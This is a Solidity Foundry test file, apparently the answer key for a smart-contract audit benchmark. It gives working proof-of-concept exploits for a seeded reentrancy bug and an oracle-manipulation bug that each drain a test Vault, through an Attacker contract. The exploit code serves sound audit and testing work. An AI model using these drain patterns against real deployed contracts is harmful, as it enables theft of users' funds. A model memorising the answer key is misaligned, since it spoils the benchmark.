// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/Vault.sol";
import "../src/PriceOracle.sol";

/// @notice Attacker contract: deposits, re-enters withdraw, and can
/// drive the oracle. All value flows through this contract so the
/// PoC never depends on prank/value quirks.
contract Attacker {
    Vault public immutable vault;
    PriceOracle public immutable oracle;

    constructor(Vault _vault, PriceOracle _oracle) {
        vault = _vault;
        oracle = _oracle;
    }

    function deposit() external payable {
        vault.deposit{value: msg.value}();
    }

    function attackReentrancy() external {
        vault.withdraw();
    }

    function setOraclePrice(uint256 p) external {
        oracle.setPrice(p);
    }

    function withdrawAll() external {
        vault.withdraw();
    }

    receive() external payable {
        if (address(vault).balance >= 1 ether) {
            vault.withdraw();
        }
    }
}

/// @title PoC — executed proof for both seeded High findings.
/// @notice These tests are the ground truth the AuditCrew must
/// reproduce on its own: same bugs, same numbers, green run.
contract VaultPoCTest is Test {
    address victim = address(0xBEEF);

    /// BUG 1 — reentrancy: 1 ETH in, whole 11 ETH vault out.
    function testReentrancyDrainsVault() public {
        PriceOracle oracle = new PriceOracle();
        Vault vault = new Vault(address(oracle));
        // Victims fund the vault with 10 ETH.
        vm.deal(victim, 10 ether);
        vm.prank(victim);
        vault.deposit{value: 10 ether}();

        Attacker atk = new Attacker(vault, oracle);
        vm.deal(address(atk), 1 ether);
        atk.deposit{value: 1 ether}();
        assertEq(vault.balanceOf(address(atk)), 1 ether);
        assertEq(address(vault).balance, 11 ether);

        uint256 before = address(atk).balance; // 0 after deposit
        atk.attackReentrancy();

        // Attacker ends with the full 11 ETH (1 own + 10 victims').
        assertEq(address(atk).balance, before + 11 ether);
        assertEq(address(vault).balance, 0);
        emit log_named_uint("attacker profit (wei)", address(atk).balance - before - 1 ether);
    }

    /// BUG 2 — oracle manipulation: 1 ETH in, whole 10 ETH vault out.
    /// Calibrated crash price mints exactly the vault balance in shares:
    ///   crashPrice = 1 ether * 1e18 / 10 ether = 1e17
    ///   shares = 1 ether * 1e18 / 1e17 = 10 ether (== vault balance)
    function testOracleManipulationDrainsVault() public {
        PriceOracle oracle = new PriceOracle();
        Vault vault = new Vault(address(oracle));
        // Victim funds the vault with 9 ETH.
        vm.deal(victim, 9 ether);
        vm.prank(victim);
        vault.deposit{value: 9 ether}();

        Attacker atk = new Attacker(vault, oracle);
        vm.deal(address(atk), 1 ether);
        // Step 1: crash the price to 1e17.
        atk.setOraclePrice(1e17);
        // Step 2: 1 ETH now mints exactly 10 ether of shares.
        atk.deposit{value: 1 ether}();
        assertEq(vault.balanceOf(address(atk)), 10 ether);
        // Step 3: restore the price, redeem everything.
        atk.setOraclePrice(1 ether);
        uint256 before = address(atk).balance; // 0 after deposit
        atk.withdrawAll();
        assertEq(address(atk).balance, before + 10 ether);
        assertEq(address(vault).balance, 0);
        emit log_named_uint("attacker profit (wei)", address(atk).balance - before - 1 ether);
    }
}
